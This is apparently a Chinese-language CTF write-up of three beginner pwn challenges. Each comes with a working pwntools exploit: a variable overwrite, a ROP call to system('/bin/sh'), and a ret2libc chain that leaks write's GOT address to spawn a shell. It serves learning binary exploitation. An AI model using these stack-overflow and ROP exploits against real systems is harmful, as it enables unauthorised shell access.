Hello_pwn

这个算是第一篇wp了吧，不足之处，还请多多指教；

拿到题目，按照惯例，先查看保护机制：

可以看到，开了NX，未开canary，丢进ida查看伪代码：

可以看到这里，先读取一个字符串，再判断如果dword = 1853186401，执行下面那个函数，点进去看：

这里直接给了flag了，思路就清晰了吧：只要让dword = 1853186401就可以了

但是读取的是unk，判断的确是dword，那就看看它们的关系：

可以看到，unk和dword偏移量是4个字节，这就好办了呀😁

直接看exp吧：

from pwn import *

a = remote('111.198.29.45',49503)

payload = 'a'*4+p64(1853186401)

a.recvuntil("lets get helloworld for bof")

a.sendline(payload)

a.interactive()

这样就做出来了，\(●ˇ∀ˇ●)/

level2

这道题题目也给出了，考察的ROP，算是很简单的一道题了；

先查看保护机制：

开了NX，没有canary

丢进ida，查看伪代码：

点进vulnerable_function()函数，查看一波：

这里我们发现，read函数极易造成栈溢出漏洞，点进buf，查看空间分配：

这里有buf长度 = （0x88 + 0x4）

然后搜索字符串，发现”/bin/sh” ,点击进去：

这里就应该清楚了，利用栈溢出漏洞，构造payload覆盖到”/bin/sh”，直接获取shell，那么还得需要寻找system的地址，再寻找一波：

到这里就全部清楚了，上exp：

from pwn import *

a = remote('111.198.29.45',54298)

bin_sh = 0x0804A024

system = 0x08048320

payload = 'a'*(0x88+0x4)+p32(system)+p32(bin_sh)

a.recvuntil("Input:\n")

a.send(payload)

a.interactive()

这道题就做完了，嘻嘻嘻~😀

level3

栈溢出 ROP

from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

a = remote('124.126.19.106',40796)

elf = ELF('./level3')

write_plt = elf.plt['write']

write_got = elf.got['write']

main_addr = elf.symbols['main']

payload = 'A' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

a.sendlineafter('Input:\n', payload)

write_addr = u32(a.recv(4))

libc = LibcSearcher('write',write_addr)

libc_base = write_addr - libc.dump('write')

sys_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = 'A' * (0x88 + 4) + p32(sys_addr) + '9527' + p32(binsh_addr)

a.sendline(payload)

a.interactive()
